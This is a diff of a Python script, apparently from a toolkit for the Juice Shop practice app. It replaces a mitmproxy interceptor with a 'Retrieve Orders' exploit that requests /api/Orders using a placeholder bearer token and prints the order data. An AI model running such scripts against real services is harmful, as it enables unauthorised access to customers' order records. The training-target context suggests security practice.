@@ -1,45 +1,22 @@
-import asyncio
-from mitmproxy import http, options
-from mitmproxy.tools.dump import DumpMaster
-import json
-
-LISTEN_HOST = "127.0.0.1"
-LISTEN_PORT = 8080
-JUICE_URL_SNIPPET = "45.76.47.218:3000"
+import requests
 
 class RetrieveOrders:
-    def request(self, flow: http.HTTPFlow):
+    def __init__(self, target_url: str):
+        self.target_url = target_url
+
+    def run_exploit(self):
+        print(f"[+] Running Retrieve Orders on {self.target_url}")
+
+        # Endpoint pour récupérer les commandes
+        endpoint = f"{self.target_url}/api/Orders"
+        headers = {"Authorization": "Bearer FAKE_USER_JWT"}
+
         try:
-            # Check if the request targets the Orders API
-            if "/api/Orders" in flow.request.pretty_url and flow.request.method == "GET":
-                # Optionally modify the request to bypass restrictions (e.g., user ID or token)
-                print("[*] Intercepted Orders API request:")
-                print(flow.request.pretty_url)
-
+            response = requests.get(endpoint, headers=headers)
+            if response.status_code == 200:
+                print("[+] Successfully retrieved orders:")
+                print(response.json())
+            else:
+                print(f"[-] Failed to retrieve orders: {response.status_code}")
         except Exception as e:
-            print(f"[!] Error processing orders request: {e}")
-
-    def response(self, flow: http.HTTPFlow):
-        try:
-            # Check if the response is for the Orders API
-            if "/api/Orders" in flow.request.pretty_url:
-                # Parse and print the JSON response
-                response_content = json.loads(flow.response.text)
-                print("[*] Extracted Orders Data:")
-                print(json.dumps(response_content, indent=4))
-        except Exception as e:
-            print(f"[!] Error processing orders response: {e}")
-
-async def run_proxy():
-    opts = options.Options(listen_host=LISTEN_HOST, listen_port=LISTEN_PORT)
-    m = DumpMaster(opts)
-    m.addons.add(RetrieveOrders())
-    try:
-        await m.run()
-    except KeyboardInterrupt:
-        print("[!] Proxy interrupted.")
-    finally:
-        m.shutdown()
-
-def retrieve_orders():
-    asyncio.run(run_proxy())
+            print(f"[!] Error during Retrieve Orders: {e}")
